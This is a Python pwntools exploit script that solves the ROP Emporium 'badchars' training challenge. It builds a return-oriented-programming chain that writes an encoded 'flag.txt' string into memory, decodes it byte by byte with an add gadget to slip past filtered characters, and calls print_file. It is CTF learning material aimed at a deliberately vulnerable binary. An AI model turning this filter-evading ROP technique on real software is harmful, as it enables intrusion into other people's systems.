# ROPE{a_placeholder_32byte_flag!}
# https://ropemporium.com/challenge/badchars.html
# pwn0x80.github.io

from pwn import *

# dj_e,rvr 64 6a 5f 65 2c 72 76 72
elf = ELF("badchars")
p = process(elf.path)
flag_txt = b"AAAAAAAA"
flag_txt1 = b"dj_e,rvr"
trash = b"A"*40


# raw_input("debug")

# 0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
payload = trash + p64(0x000000000040069c) + flag_txt1 + p64(0x00601038) + p64(
    0x2) + p64(0x00601038) + p64(0x0000000000400634) + p64(0x00000000040062c)


decode = [hex(i+0x00601039) for i in range(7)]
for i in range(7):
    payload += p64(0x00000000004006a2)
    payload += p64(int(decode[i].encode(), 16))
    payload += p64(0x00000000040062c)

# 0x00000000004006a2 :pop r15 ; ret

# 0x0000000000400634 : mov qword ptr [r13], r12 ; ret

# 0x000000000040062c : add byte ptr [r15], r14b ; ret
# free store space 0x00601038
# func call
payload += p64(0x00000000004006a3)
payload += p64(0x00601038)
payload += p64(0x400510)


# 0x400510 <print_file@plt>:	"\377%\n\v "

# 0x00000000004006a3 : pop rdi ; ret

p.sendline(payload)

response = p.recv()

print(response.decode())

p.interactive()
